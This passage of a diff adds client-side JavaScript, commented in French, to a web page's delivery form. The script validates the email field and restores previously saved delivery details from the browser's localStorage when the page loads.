+      
+      // Validation spécifique pour l'email
+      const email = document.getElementById('email');
+      if (email.value && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email.value)) {
+        email.style.borderColor = 'var(--danger)';
+        isValid = false;
+      }
+      
+      return isValid;
+    }
+    
+    // Charger les données précédentes si elles existent
+    document.addEventListener('DOMContentLoaded', function() {
+      const savedData = localStorage.getItem('deliveryInfo');
+      if (savedData) {
+        const formData = JSON.parse(savedData);
+        
+        document.getElementById('firstName').value = formData.firstName || '';
+        document.getElementById('lastName').value = formData.lastName || '';
+        document.getElementById('email').value = formData.email || '';
+        document.getElementById('phone').value = formData.phone || '';
+        document.getElementById('address').value = formData.address || '';
+        document.getElementById('city').value = formData.city || '';
+        document.getElementById('zipCode').value = formData.zipCode || '';
+        document.getElementById('country').value = formData.country || '';
+      }
+    });
+  </script>
 </body>
 </html>
